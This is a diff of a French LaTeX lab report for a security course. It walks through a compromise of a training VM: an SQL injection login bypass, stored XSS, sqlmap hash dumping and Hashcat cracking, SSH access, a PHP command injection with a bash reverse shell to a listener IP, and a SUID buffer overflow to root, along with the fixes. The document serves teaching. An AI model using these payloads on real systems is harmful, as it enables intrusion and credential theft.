@@ -213,7 +213,15 @@ Montrez que la page de connexion est vulnérable aux injections SQL.
 En utilisant une injection SQL, connectez-vous sur le site. Expliquez avec vos mots comment fonctionne votre attaque.
 
 \vspace{0.8em}
-\textit{La page de connexion est vulnérable aux injections SQL car les entrées utilisateur sont directement intégrées dans la requête SQL sans validation ni requêtes paramétrées. En entrant une chaîne spéciale contenant une quote et un commentaire SQL, il est possible de modifier la structure de la requête envoyée à la base de données. L'erreur SQL affichée par le serveur révèle la requête complète exécutée, ce qui prouve que l'entrée utilisateur est concaténée telle quelle dans le SQL. Cela permet de contourner la vérification du mot de passe et démontre une vulnérabilité d'injection SQL.}
+\textit{En saisissant \texttt{admin' \#} dans le champ du nom d'utilisateur et un mot de passe quelconque, il est possible de se connecter directement au site. Le payload fonctionne de la manière suivante : la requête originale du serveur est :}
+\begin{center}
+\texttt{SELECT * FROM users WHERE username='admin' \# ' AND password='...'}
+\end{center}
+\textit{Le caractère \texttt{'} ferme la chaîne du nom d'utilisateur, puis le caractère \texttt{\#} met en commentaire tout le reste de la requête, incluant la vérification du mot de passe. La requête exécutée devient donc équivalente à :}
+\begin{center}
+\texttt{SELECT * FROM users WHERE username='admin'}
+\end{center}
+\textit{Le serveur retourne l'enregistrement de l'utilisateur admin sans vérifier le mot de passe, ce qui permet de contourner l'authentification et d'accéder au tableau de bord.}
 
 \begin{center}
 \includegraphics[width=0.85\textwidth]{images/2.2.png}
@@ -232,11 +240,11 @@ Montrez que la page de soumission de tickets est vulnérable aux injections XSS.
 \textit{Après soumission, l'ouverture du ticket déclenche l'exécution du script dans le navigateur et une boîte de dialogue affiche TEST. Cela démontre que l'entrée utilisateur est enregistrée par le serveur puis réaffichée sans être filtrée, et qu'elle est exécutée côté client. La page de soumission de tickets est donc vulnérable à une XSS stockée.}
 
 \begin{center}
-\includegraphics[width=0.85\textwidth]{images/xss-1.png}
-
+\includegraphics[width=0.85\textwidth,keepaspectratio]{images/xss-1.png}
+\end{center}
 \vspace{0.5em}
-
-\includegraphics[width=0.85\textwidth]{images/xss-2.png}
+\begin{center}
+\includegraphics[width=0.85\textwidth,keepaspectratio]{images/xss-2.png}
 \end{center}
 
 %-------------------------------------------------------------------------------%
@@ -254,11 +262,11 @@ L'administratrice du système consulte régulièrement les tickets. Utilisez une
 \textit{Cette attaque fonctionne parce que le site affiche le contenu des tickets sans validation ni échappement, ce qui permet l'exécution de code arbitraire dans le navigateur d'un utilisateur authentifié.}
 
 \begin{center}
-\includegraphics[width=0.85\textwidth]{images/xss-script.png}
-
+\includegraphics[width=0.85\textwidth,keepaspectratio]{images/xss-script.png}
+\end{center}
 \vspace{0.5em}
-
-\includegraphics[width=0.85\textwidth]{images/xss-admin.png}
+\begin{center}
+\includegraphics[width=0.85\textwidth,keepaspectratio]{images/xss-admin.png}
 \end{center}
 
 %-------------------------------------------------------------------------------%
@@ -313,7 +321,9 @@ Expliquez précisément comment corriger la vulnérabilité qui permet cette con
 \textit{La vulnérabilité provient du fait que le serveur FTP autorise les connexions anonymes. Toute personne sur le réseau peut donc se connecter sans identifiants et accéder directement aux fichiers exposés, incluant le code source de l'application. Cela facilite fortement l'analyse et l'exploitation de l'application.}
 
 \medskip
-\textit{La correction consiste à désactiver l'accès anonyme dans la configuration de vsftpd. Dans le fichier de configuration \texttt{/etc/vsftpd/vsftpd.conf}, l'option \texttt{anonymous\_enable} doit être réglée à \texttt{NO}. Après modification, le service FTP doit être redémarré pour appliquer la configuration.}
+\begin{sloppypar}
+\textit{La correction consiste à désactiver l'accès anonyme dans la configuration de vsftpd. Dans le fichier \texttt{/etc/vsftpd/vsftpd.conf}, l'option \texttt{anonymous\_enable} doit être réglée à \texttt{NO}. Après modification, le service FTP doit être redémarré pour appliquer la configuration.}
+\end{sloppypar}
 
 \medskip
 \textit{En complément, l'accès FTP devrait être limité aux seuls utilisateurs autorisés via des comptes authentifiés, avec des permissions minimales sur les répertoires. Le répertoire contenant le code source de l'application ne devrait jamais être exposé publiquement via FTP. Une solution plus sécuritaire consiste à remplacer FTP par SFTP ou un mécanisme de déploiement interne afin d'éviter toute exposition inutile de fichiers sensibles.}
@@ -324,7 +334,14 @@ Expliquez précisément comment corriger la vulnérabilité qui permet cette con
 Localisez dans le code PHP l'injection SQL exploitée dans la partie 4 et proposez une correction.
 
 \vspace{0.8em}
-\textit{L'injection SQL est dans le fichier login.php, dans le bloc qui traite le POST. Elle se situe à l'endroit où la requête est construite en concaténant directement \$username et \$password dans la chaîne SQL. La correction consiste à remplacer cette concaténation par une requête préparée.}
+\textit{L'injection SQL est dans le fichier login.php, dans le bloc qui traite le POST. La ligne vulnérable construit la requête en concaténant directement les variables \$username et \$password :}
+
+\begin{lstlisting}[language=PHP, basicstyle=\small\ttfamily, breaklines=true, frame=single]
+$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+$result = $mysqli->query($query);
+\end{lstlisting}
+
+\textit{La correction consiste à remplacer cette concaténation par une requête préparée avec des paramètres liés :}
 
 \begin{lstlisting}[language=PHP, basicstyle=\small\ttfamily, breaklines=true, frame=single]
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
@@ -381,28 +398,57 @@ En vous basant sur le code source PHP et Javascript de l'application web, expliq
 %*******************************************************************************%
 
 \subsection{Récupération du hash de carol par injection SQL [/2]}
-L'accès à la base de données a été obtenu par une injection SQL dans le formulaire de connexion. En saisissant la chaîne \texttt{admin' \#} dans le champ utilisateur, le caractère \texttt{'} ferme la requête et le caractère \texttt{\#} met la suite en commentaire.
+En utilisant une injection SQL, récupérez le hash du mot de passe de carol.
+
+\vspace{0.8em}
+\textit{L'outil sqlmap a été utilisé pour exploiter automatiquement la vulnérabilité d'injection SQL identifiée dans le formulaire de connexion. En ciblant le paramètre vulnérable de la page login.php, sqlmap a détecté l'injection et a permis d'extraire le contenu de la base de données.}
+
+\medskip
+\textit{La commande a permis de dumper la table \texttt{users} de la base de données \texttt{login}. Le résultat contient deux entrées :}
+\begin{itemize}
+\item \textit{carol : \texttt{6998506d94a687fcac1d80ee846763ba}}
+\item \textit{admin : \texttt{1f1d046d1a0156e410bbf5caa9869975}}
+\end{itemize}
+\textit{Le hash MD5 du mot de passe de carol a ainsi été récupéré directement depuis la base de données grâce à sqlmap, sans avoir besoin de se connecter à l'interface web.}
 
 \begin{center}
 \includegraphics[width=0.85\textwidth]{images/4.1.png}
 \end{center}
 
 \subsection{Craquage du hash [/1]}
-Une fois le hash MD5 récupéré, nous avons effectué une attaque par dictionnaire avec \textbf{John the Ripper} et la liste \texttt{rockyou.txt}.
+Cassez le hash pour obtenir le mot de passe de carol. Indice : le mot de passe est composé uniquement de 6 chiffres.
+
+\vspace{0.8em}
+\textit{Une fois le hash du mot de passe de carol récupéré, nous l'avons cassé avec Hashcat~\cite{hashcat}. Le hash étant un MD5, nous avons utilisé le mode \texttt{-m 0}. Étant donné l'indice que le mot de passe est composé uniquement de 6 chiffres, nous avons lancé une attaque par masque (brute force ciblée) avec le masque \texttt{?d?d?d?d?d?d}, qui énumère toutes les combinaisons possibles de 000000 à 999999. Hashcat a retrouvé le mot de passe associé au hash \texttt{6998506d94a687fcac1d80ee846763ba}, soit \texttt{952427}, comme le montre la capture d'écran.}
 
 \begin{center}
-\includegraphics[width=0.85\textwidth]{images/4.2.png}
+\includegraphics[width=0.85\textwidth]{images/hashcat-1.png}
 \end{center}
 
 \subsection{Récupération de controller.c via SSH [/1]}
-La connexion SSH au compte de Carol a permis de valider l'accès et de récupérer le code source de \texttt{controller.c}.
+Connectez-vous en SSH au compte de Carol, et récupérez le fichier \texttt{controller.c}.
+
+\vspace{0.8em}
+\textit{Une fois le mot de passe en clair obtenu (\texttt{952427}), nous nous sommes connectés au serveur via la commande \texttt{ssh carol@10.22.0.11} depuis Kali. La connexion SSH a été établie avec succès, confirmant que le mot de passe cassé est valide.}
+
+\medskip
+\textit{Une fois connectés, nous avons exploré le répertoire personnel de Carol et trouvé le dossier \texttt{\~{}/cumulocode\_project}. Un \texttt{ls} dans ce répertoire ne montre aucun fichier visible. Cependant, un \texttt{git status} révèle que le dossier est un dépôt git sur la branche master. En consultant l'historique avec \texttt{git log}, deux commits apparaissent :}
+\begin{itemize}
+\item \textit{Le commit initial, intitulé \texttt{Implemented Cumulocode secret controller application}, qui a ajouté le fichier \texttt{controller.c}.}
+\item \textit{Le commit suivant, intitulé \texttt{Removed confidential information}, qui a supprimé le fichier du répertoire.}
+\end{itemize}
+\textit{Le fichier \texttt{controller.c} a donc été récupéré en utilisant la commande \texttt{git checkout} sur le commit initial, ce qui a permis de restaurer le fichier supprimé depuis l'historique git. Le contenu de ce fichier sera analysé dans la section suivante.}
 
 \begin{center}
-    \includegraphics[width=0.85\textwidth]{images/4.3.png} 
-    
-    \vspace{1em}
-    
-    \includegraphics[width=0.85\textwidth]{images/4.3_suite.png}
+\includegraphics[width=0.85\textwidth]{images/4.3.png}
+\end{center}
+
+\begin{center}
+\includegraphics[width=0.85\textwidth]{images/carol-git.png}
+\end{center}
+
+\begin{center}
+\includegraphics[width=0.85\textwidth]{images/4.3_suite.png}
 \end{center}
 
 %*******************************************************************************%
@@ -410,19 +456,35 @@ La connexion SSH au compte de Carol a permis de valider l'accès et de récupér
 %*******************************************************************************%
 
 \subsection{Shell www-data par injection de commande PHP [/2]}
-Un reverse shell a été obtenu en exploitant une faille dans \texttt{toggleService.php}. En injectant la commande : \\
-\texttt{; bash -i >\& /dev/tcp/10.22.0.1/4444 0>\&1} \\
-nous avons forcé le serveur à se connecter à notre écouteur Netcat.
+Utilisez une injection de commande PHP dans le mécanisme qui permet de basculer l'état des services pour obtenir un shell en tant que \texttt{www-data}.
+
+\vspace{0.8em}
+\textit{L'obtention du premier shell à distance a été réalisée en exploitant une faille d'injection de commande dans le script toggleService.php. Le paramètre service est concaténé directement dans une commande système sans validation suffisante. En injectant un point-virgule suivi d'un reverse shell Bash (\texttt{service=; bash -i >\& /dev/tcp/[IP]/4444 0>\&1}), nous avons forcé le serveur à commencer une connexion vers notre machine d'attaque où un écouteur Netcat (\texttt{nc -lvnp 4444}) était actif.}
 
 \begin{center}
     \includegraphics[width=0.85\textwidth]{images/5.1.png}
 \end{center}
 
 \subsection{Analyse de controller.c et vulnérabilité buffer overflow [/2]}
-Le programme utilise la fonction \texttt{gets()}, qui ne vérifie pas la taille des données lues. Cela permet d'écraser la variable \texttt{servicePath} sur la pile et de détourner l'exécution vers un shell root.
+Que fait le programme \texttt{controller.c}~? Identifiez une vulnérabilité causée par un débordement de tampon et expliquez comment la corriger.
+
+\vspace{0.8em}
+\textit{Le programme controller.c est un utilitaire conçu pour gérer des services système avec les privilèges d'un administrateur, qui sont obtenus grâce aux appels \texttt{setuid(0)} et \texttt{setgid(0)}. La vulnérabilité principale se situe à la ligne 20 du code avec l'utilisation de la fonction \texttt{gets(command)}.}
+
+\medskip
+\textit{Cette fonction est dangereuse car elle lit les entrées de l'utilisateur sans jamais vérifier la longueur. Le tableau \texttt{command} étant limité à juste 32 caractères, toute entrée qui excède cette taille débordera de l'espace alloué en mémoire. Puisque la variable \texttt{servicePath} est déclarée juste en haut de la pile d'exécution, ce débordement viendra écraser son contenu.}
+
+\medskip
+\textit{Ainsi, en écrasant la mémoire de \texttt{servicePath}, un attaquant peut manipuler la fonction \texttt{execl()}, qui est appelée à la fin du code pour exécuter un autre binaire (ex.\ : /bin/sh) au lieu de /usr/sbin/service. Le programme maintient ses privilèges root lors de l'exécution, donc cela mène à un compromis total du système.}
+
+\medskip
+\textit{Pour corriger cette faille, il faut remplacer \texttt{gets(command)} par une fonction plus sécurisée qui limite la taille de lecture, comme \texttt{fgets(command, sizeof(command), stdin)}.}
 
 \subsection{Exploitation du buffer overflow pour devenir root [/2]}
-En envoyant 64 octets de remplissage suivis de \texttt{/bin/sh}, nous avons obtenu un accès root immédiat grâce au bit SUID.
+Exploitez le dépassement de tampon dans le programme \texttt{controller} et devenez root.
+
+\vspace{0.8em}
+\textit{L'exploitation du dépassement de tampon a permis d'obtenir les privilèges root. Puisque le binaire controller possède le bit SUID (Set Owner User ID up on execution), il s'exécute avec les droits du propriétaire, à savoir root. En envoyant une charge composée de 64 octets de remplissage suivis du chemin \texttt{/bin/sh}, nous avons écrasé la variable \texttt{servicePath} en mémoire. Le programme a alors exécuté un shell au lieu du service, nous donnant un accès root immédiat.}
 
 \begin{center}
 \includegraphics[width=0.85\textwidth]{images/5.2.png}
@@ -432,7 +494,16 @@ En envoyant 64 octets de remplissage suivis de \texttt{/bin/sh}, nous avons obte
 \section{Accès physique = Game Over [3 points bonus]}
 %*******************************************************************************%
 
-Nous avons monté le disque virtuel \texttt{TP2-disk001.vdi} sur Kali Linux. L'utilisation de \texttt{sudo chroot /mnt/tp /bin/bash} nous a permis de devenir root sans mot de passe GRUB.
+Obtenez un shell root sur la machine virtuelle TP2.
+
+\vspace{0.8em}
+\textit{Étant donné un accès physique à la machine, nous avons monté la partition du système Fedora depuis la VM Kali. Comme Fedora utilise LVM, nous avons d'abord activé les volumes logiques, puis monté le volume \texttt{/dev/fedora\_fedora/root} sur \texttt{/mnt/tp}. Nous avons ensuite utilisé la commande \texttt{chroot /mnt/tp /bin/bash} afin d'obtenir un shell dans le système de fichiers Fedora.}
+
+\medskip
+\textit{La commande \texttt{whoami} retourne root et \texttt{cat /etc/fedora-release} confirme que nous sommes bien dans l'environnement Fedora. Cela démontre qu'avec un accès physique et en l'absence de chiffrement du disque, il est possible de monter le système de fichiers et d'obtenir un accès root complet.}
+
+\medskip
+\textit{Cette situation illustre que sans protection du bootloader et sans chiffrement complet du disque, un accès physique compromet totalement la sécurité du système.}
 
 \begin{center}
     \includegraphics[width=0.85\textwidth]{images/6.png}
@@ -447,8 +518,16 @@ Nous avons monté le disque virtuel \texttt{TP2-disk001.vdi} sur Kali Linux. L'u
 
 \begin{thebibliography}{99}
 \bibitem{nmap} nmap -- Network Mapper. \url{https://nmap.org/}
-\bibitem{kali} Kali Linux Documentation. \url{https://www.kali.org/docs/}
-\bibitem{owasp} OWASP SQL Injection Guide. \url{https://owasp.org/www-community/attacks/SQL_Injection}
+\bibitem{sqli} Injection SQL -- SQL Injection Cheat Sheet. \url{https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/}
+\bibitem{xss} Injection XSS -- OWASP. \url{https://owasp.org/www-community/attacks/xss/}
+\bibitem{cookiegrabber} Récupération de cookies -- Cookie Grabber XSS. \url{https://medium.com/@laur.telliskivi/pentesting-basics-cookie-grabber-xss-8b672e4738b2}
+\bibitem{requestbin} RequestBin -- Pipedream. \url{https://pipedream.com/requestbin}
+\bibitem{vsftpd} vsftpd.conf -- Linux man page. \url{https://linux.die.net/man/5/vsftpd.conf}
+\bibitem{sqlmap} sqlmap -- Tutorial. \url{https://www.sqlinjection.net/sqlmap/tutorial/}
+\bibitem{hashcat} hashcat -- advanced password recovery. \url{https://hashcat.net/hashcat/}
+\bibitem{git} git -- Distributed version control. \url{https://git-scm.com/}
+\bibitem{cmdinject} Injection de commandes PHP. \url{https://www.stackhawk.com/blog/php-command-injection/}
+\bibitem{bof} Dépassement de tampon -- Understanding Buffer Overflow. \url{https://medium.com/techloop/understanding-buffer-overflow-vulnerability-85ac22ec8cd3}
 \end{thebibliography}
 
 \end{document}
